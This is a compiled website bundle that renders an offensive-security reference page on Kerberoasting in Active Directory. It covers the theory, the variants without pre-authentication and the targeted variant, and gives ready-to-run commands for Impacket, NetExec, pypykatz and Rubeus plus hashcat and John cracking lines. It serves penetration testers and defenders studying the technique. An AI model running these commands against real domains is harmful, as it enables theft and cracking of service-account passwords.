import{_ as o,c as p,a5 as n,G as a,w as i,B as l,o as k,j as e,a as s}from"./chunks/framework.B5CpDqM0.js";const F=JSON.parse('{"title":"Kerberoast","description":"MITRE ATT&CK™ Sub-technique T1558.003","frontmatter":{"description":"MITRE ATT&CK™ Sub-technique T1558.003","authors":"BlWasp, Lamber-maybe, ShutdownRepo, amirr0r, mpgn, sckdev"},"headers":[],"relativePath":"ad/movement/kerberos/kerberoast.md","filePath":"ad/movement/kerberos/kerberoast.md","lastUpdated":1724982529000}'),c={name:"ad/movement/kerberos/kerberoast.md"};function d(u,t,g,b,m,y){const r=l("PluginTabsTab"),h=l("PluginTabs");return k(),p("div",null,[t[4]||(t[4]=n('<h1 id="kerberoast" tabindex="-1">Kerberoast <a class="header-anchor" href="#kerberoast" aria-label="Permalink to &quot;Kerberoast&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>When asking the KDC (Key Distribution Center) for a Service Ticket (ST), the requesting user needs to send a valid TGT (Ticket Granting Ticket) and the service name (<code>sname</code>) of the service wanted. If the TGT is valid, and if the service exists, the KDC sends the ST to the requesting user.</p><p>Multiple formats are accepted for the <code>sname</code> field: servicePrincipalName (SPN), sAMAccountName (SAN), userPrincipalName (UPN), etc. (see <a href="./#tickets">Kerberos tickets</a> &quot;cname formats&quot;).</p><p>The ST is encrypted with the requested service account&#39;s NT hash. If an attacker has a valid TGT and knows a service (by its SAN or SPN), he can request a ST for this service and crack it offline later in an attempt to retrieve that service account&#39;s password.</p><p>In most situations, services accounts are machine accounts, which have very complex, long, and random passwords. But if a service account, with a human-defined password, has a SPN set, attackers can request a ST for this service and attempt to crack it offline. <strong>This is Kerberoasting</strong>.</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><div class="important custom-block"><p>Unlike <a href="./asreproast">ASREProasting</a>, this attack can only be carried out with a prior foothold (valid domain credentials), except in the <a href="./kerberoast#kerberoast-w-o-pre-authentication">Kerberoasting without pre-authentication</a> scenario.</p></div>',8)),a(h,null,{default:i(()=>[a(r,{label:"UNIX-like"},{default:i(()=>t[0]||(t[0]=[e("p",null,[s("The "),e("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),s(" script "),e("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py",target:"_blank",rel:"noreferrer"},"GetUserSPNs"),s(" (Python) can perform all the necessary steps to request a ST for a service given its SPN (or name) and valid domain credentials.")],-1),e("div",{class:"tip custom-block"},[e("p",null,[s("The Kerberoasting attack can be conducted without knowing any SPN of the target account, since a service ticket can be request for as long as the service's SAN ("),e("code",null,"sAMAccountName"),s(") is known. ("),e("a",{href:"https://swarm.ptsecurity.com/kerberoasting-without-spns/",target:"_blank",rel:"noreferrer"},"swarm.ptsecurity.com"),s(")")]),e("p",null,[s("Nota bene, Kerberos can deliver service tickets even if the service has no SPN at all, but then the service's SAN must end with "),e("code",null,"$"),s(", and in this case it's hard to know for sure if the service's password is defined by a human. Kerberoast attacks usually target user accounts with at least one SPN ("),e("code",null,"servicePrincipalName"),s(") since they probably have human-defined passwords (sources: "),e("a",{href:"https://twitter.com/SteveSyfuhs/status/1613956603807690753",target:"_blank",rel:"noreferrer"},"Twitter"),s(" and "),e("a",{href:"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/a7ad31b0-37a4-4344-b9a7-01d4d086097e",target:"_blank",rel:"noreferrer"},"[MS-KILE] section 3.3.5.1.1"),s(").")])],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with a password")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"GetUserSPNs.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -outputfile"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," kerberoastables.txt"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $KeyDistributionCenter "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'DOMAIN/USER:Password'")]),s(`
`),e("span",{class:"line"}),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with an NT hash")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"GetUserSPNs.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -outputfile"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," kerberoastables.txt"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'LMhash:NThash'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $KeyDistributionCenter "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'DOMAIN/USER'")])])])],-1),e("p",null,[s("This can also be achieved with "),e("a",{href:"https://github.com/Pennyw0rth/NetExec",target:"_blank",rel:"noreferrer"},"NetExec"),s(" (Python).")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ldap"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-u"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-p"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $PASSWORD "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--kerberoasting"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," kerberoastables.txt"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --kdcHost"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $KeyDistributionCenter")])])])],-1),e("p",null,[s("Using "),e("a",{href:"https://github.com/skelsec/pypykatz/wiki/Kerberos-spnroast-command",target:"_blank",rel:"noreferrer"},"pypykatz"),s(" (Python) it is possible to request an RC4 encrypted ST even when AES encryption is enabled (and if RC4 is still accepted of course). The tool features an -e flag which specifies what encryption type should be requested (default to 23, i.e. RC4). Trying to crack "),e("code",null,"$krb5tgs$23"),s(" takes less time than for "),e("code",null,"krb5tgs$18"),s(".")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"pypykatz"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," kerberos"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," spnroast"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-t"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGET_USER "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-e"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 23"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'kerberos+password://DOMAIN\\username:Password@IP'")])])])],-1)])),_:1}),a(r,{label:"Windows"},{default:i(()=>t[1]||(t[1]=[e("p",null,[e("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"Rubeus"),s(" (C#) can be used for that purpose.")],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," kerberoast "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"outfile:kerberoastables.txt")])])])],-1)])),_:1})]),_:1}),t[5]||(t[5]=n('<p><a href="https://github.com/hashcat/hashcat" target="_blank" rel="noreferrer">Hashcat</a> and <a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="noreferrer">JohnTheRipper</a> can then be used to try <a href="./../credentials/cracking">cracking the hash</a>.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">hashcat</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -m</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 13100</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> kerberoastables.txt</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $wordlist</span></span></code></pre></div><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">john</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --format=krb5tgs</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --wordlist=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$wordlist</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> kerberoastables.txt</span></span></code></pre></div><h3 id="kerberoast-w-o-pre-authentication" tabindex="-1">Kerberoast w/o pre-authentication <a class="header-anchor" href="#kerberoast-w-o-pre-authentication" aria-label="Permalink to &quot;Kerberoast w/o pre-authentication&quot;">​</a></h3><p>In September 2022, <a href="https://twitter.com/exploitph" target="_blank" rel="noreferrer">Charlie Cark</a> explained how Service Tickets could be obtained through <code>AS-REQ</code> requests (which are usually used for TGT requests), instead of the usual <code>TGS-REQ</code>. He demonstrated (and <a href="https://github.com/GhostPack/Rubeus/pull/139" target="_blank" rel="noreferrer">implemented</a>) how to abuse this in a Kerberoasting scenario.</p><p>If an attacker knows of an account for which pre-authentication isn&#39;t required (i.e. an <a href="./asreproast">ASREProastable</a> account), as well as one (or multiple) service accounts to target, a Kerberoast attack can be attempted without having to control any Active Directory account (since pre-authentication won&#39;t be required).</p>',6)),a(h,null,{default:i(()=>[a(r,{label:"UNIX-like"},{default:i(()=>t[2]||(t[2]=[e("p",null,[s("The "),e("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),s(" script "),e("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py",target:"_blank",rel:"noreferrer"},"GetUserSPNs"),s(" (Python) can perform all the necessary steps to request a ST for a service given its SPN (or name) and valid domain credentials.")],-1),e("p",null,[e("em",null,"At the time of writing, Sept. 28th 2022,"),s(),e("a",{href:"https://github.com/SecureAuthCorp/impacket/pull/1413",target:"_blank",rel:"noreferrer"},[e("em",null,"the pull request (#1413)")]),s(),e("em",null,[s("adding the "),e("code",null,"-no-preauth"),s(" option for "),e("code",null,"GetUserSPNs.py"),s(" is pending.")])],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"GetUserSPNs.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -no-preauth"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "bobby"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -usersfile"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "services.txt"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-host"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "DC_IP_or_HOST"'),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "DOMAIN.LOCAL"/')])])])],-1),e("div",{class:"language- vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"}),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",null,"srv01")]),s(`
`),e("span",{class:"line"},[e("span",null,"cifs/srv02.domain.local")]),s(`
`),e("span",{class:"line"},[e("span",null,"cifs/srv02")])])])],-1)])),_:1}),a(r,{label:"Windows"},{default:i(()=>t[3]||(t[3]=[e("p",null,[e("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"Rubeus"),s(" (C#) can be used for that purpose.")],-1),e("p",null,[e("em",null,"At the time of writing, Sept. 28th 2022,"),s(),e("a",{href:"https://github.com/GhostPack/Rubeus/pull/139",target:"_blank",rel:"noreferrer"},[e("em",null,"the pull request (#139)")]),s(),e("em",null,[s("adding the "),e("code",null,"/nopreauth"),s(" option for Rubeus' "),e("code",null,"kerberoast"),s(" command is pending.")])],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," kerberoast "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"outfile:kerberoastables.txt "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"DOMAIN.LOCAL"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"dc:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"DC01.DOMAIN.LOCAL"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"nopreauth:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"nopreauth_user"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"spn:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"target_service"')])])])],-1)])),_:1})]),_:1}),t[6]||(t[6]=n('<h3 id="targeted-kerberoasting" tabindex="-1">Targeted Kerberoasting <a class="header-anchor" href="#targeted-kerberoasting" aria-label="Permalink to &quot;Targeted Kerberoasting&quot;">​</a></h3><p>If an attacker controls an account with the rights to add an SPN to another (<a href="./../dacl/#genericall"><code>GenericAll</code></a>, <a href="./../dacl/#genericwrite"><code>GenericWrite</code></a>), it can be abused to make that other account vulnerable to Kerberoast (see <a href="./../dacl/targeted-kerberoasting">exploitation</a>).</p><div class="tip custom-block"><p>Controlling a member of the <a href="./../builtins/security-groups">Account Operators</a> group, targeted Kerberoasting can be conducted for the whole domain (see <a href="./../dacl/targeted-kerberoasting">exploitation</a>).</p></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://en.hackndo.com/kerberos" target="_blank" rel="noreferrer">https://en.hackndo.com/kerberos</a></p><p><a href="https://adsecurity.org/?p=2011" target="_blank" rel="noreferrer">https://adsecurity.org/?p=2011</a></p><p><a href="https://www.semperis.com/blog/new-attack-paths-as-requested-sts/" target="_blank" rel="noreferrer">https://www.semperis.com/blog/new-attack-paths-as-requested-sts/</a></p><p><a href="https://swarm.ptsecurity.com/kerberoasting-without-spns/" target="_blank" rel="noreferrer">https://swarm.ptsecurity.com/kerberoasting-without-spns/</a></p>',8))])}const C=o(c,[["render",d]]);export{F as __pageData,C as default};
